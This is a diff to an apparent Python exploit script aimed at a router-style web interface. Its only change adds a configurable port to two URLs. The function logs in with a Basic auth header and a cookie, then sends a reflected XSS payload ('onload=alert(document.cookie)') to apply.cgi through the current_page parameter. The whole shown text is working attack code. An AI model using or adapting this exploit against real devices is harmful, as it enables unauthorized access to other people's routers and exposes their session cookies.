@@ -18,12 +18,12 @@ description= r"""
 def packet(target, port, cookie):
 	try:
 		#Login
-		URL = 'http://'+target+'/'
+		URL = 'http://'+target+':'+port+'/'
 		headers = {'Cookie' : 'traffic_warning_NaN=2019.11:1', 'Authorization' : 'Basic ' + cookie}
 		s = requests.Session()
 		req = s.get(URL, headers=headers)
 
-		URL = 'http://'+target+'/apply.cgi?current_page=%22%3E%3Cbody%20onload=alert%28document.cookie%29%3E'
+		URL = 'http://'+target+':'+port+'/apply.cgi?current_page=%22%3E%3Cbody%20onload=alert%28document.cookie%29%3E'
 		req = s.get(URL, headers=headers)
 		
 	
